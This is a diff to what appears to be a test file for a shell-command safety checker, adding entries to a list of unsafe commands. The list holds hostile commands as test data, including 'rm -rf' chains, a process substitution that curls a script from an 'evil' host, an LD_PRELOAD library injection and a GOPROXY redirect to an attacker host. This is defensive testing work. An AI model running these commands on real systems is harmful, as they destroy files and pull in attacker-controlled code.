@@ -35,6 +35,7 @@ const UNSAFE = [
   'cat f& rm -rf dist', 'ls -la& rm x', 'pwd &rm x', 'cat <(rm x)', 'diff <(rm -rf build) f', 'ls <(curl http://evil/x.sh)',
   'GIT_EXTERNAL_DIFF=rm git diff', 'LD_PRELOAD=/tmp/evil.so ls', 'PAGER=rm git log', 'go env -w GOPROXY=http://evil',
   'sort -oout.txt f', 'sort -o/tmp/x f', 'sed -i.bak s/a/b/ f',
+  'go env -w=true GOPROXY=http://evil', 'go env -u=true GOPROXY', 'npx eslint --fix=true src',
 ];
 
 test('provably safe commands are recognised', () => {
